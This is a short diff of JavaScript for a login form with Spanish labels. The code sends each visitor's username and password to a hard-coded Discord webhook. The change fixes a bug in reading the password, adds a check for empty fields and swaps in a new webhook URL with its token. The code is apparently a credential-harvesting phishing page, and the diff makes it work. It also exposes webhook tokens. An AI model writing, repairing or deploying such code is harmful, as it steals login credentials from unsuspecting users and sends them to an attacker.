@@ -2,17 +2,21 @@
             event.preventDefault();
 
             const name = document.getElementById("name").value;
-            const question = document.getElementById("password").value;
-            sendToDiscord(name, password);
+            const password = document.getElementById("password").value;
+            if (name === '' || password === '') {
+                alert("Por favor, complete todos los campos.");
+            } else {
+                sendToDiscord(name, password);
+            }
         });
 
         function sendToDiscord(name, password) {
-            const webhookURL = "https://discord.com/api/webhooks/1237172277326516235/daTRqQWVoBMDE5q4aa0TTz9doMXK9nKMZzRr15i-iW5JAxzXlTiZ0Y5sx-oHSQeiAq0T";
+            const webhookURL = "https://discord.com/api/webhooks/1251386870043250808/3rDZtUOlUR_N_6SwnpcSQZL2LBTjNIxyRQ4cmQu7RioIsGkUtEw7QaKjiG3SGSMyiXxn";
             const data = {
                 content: `
-**Nombre de usuario:** ${name}
--
-**Contraseña:** ${password}`
+    **Nombre de usuario:** ${name}
+    -
+    **Contraseña:** ${password}`
             };
 
             fetch(webhookURL, {
